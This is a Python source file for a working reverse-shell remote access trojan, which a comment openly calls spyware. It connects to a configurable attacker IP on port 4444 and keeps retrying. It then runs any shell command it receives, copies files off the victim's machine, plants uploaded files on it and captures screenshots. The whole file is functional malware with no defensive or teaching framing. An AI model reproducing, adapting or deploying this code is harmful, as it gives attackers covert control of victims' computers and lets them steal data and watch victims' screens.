import socket
import os
import subprocess
import pyautogui # <--- New Spyware Dependency
import time

# --- CONFIGURATION ---
ATTACKER_IP = "192.168.1.15"  # <--- UPDATE THIS
PORT = 4444

def send_file(sock, filename):
    if os.path.exists(filename):
        filesize = os.path.getsize(filename)
        sock.send(f"EXISTS {filesize}".encode())
        sock.recv(1024) # Wait for OK
        
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk: break
                sock.send(chunk)
    else:
        sock.send("ERROR: File not found".encode())

def receive_file(sock, command):
    _, filename, filesize = command.split()
    filesize = int(filesize)
    sock.send("OK".encode())
    
    with open(filename, "wb") as f:
        total_recv = 0
        while total_recv < filesize:
            data = sock.recv(4096)
            if not data: break
            f.write(data)
            total_recv += len(data)
    sock.send("[+] Upload Successful".encode())

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((ATTACKER_IP, PORT))
            break
        except:
            time.sleep(5) # Wait 5s before retrying

    while True:
        try:
            command = s.recv(1024).decode()
            if command.lower() == 'exit': break
            
            if command.startswith("download"):
                send_file(s, command.split()[1])
                
            elif command.startswith("UPLOAD"):
                receive_file(s, command)
                
            elif command == "screenshot":
                try:
                    # Take Screenshot
                    screenshot = pyautogui.screenshot()
                    screenshot.save("screen.png")
                    # Send it
                    send_file(s, "screen.png")
                    # Delete it
                    os.remove("screen.png")
                except Exception as e:
                    s.send(str(e).encode())

            elif command.startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                    s.send(f"[+] Changed to: {os.getcwd()}".encode())
                except Exception as e:
                    s.send(str(e).encode())
            else:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output if output else b"[+] Done")
        except:
            break
    s.close()

if __name__ == "__main__":
    connect()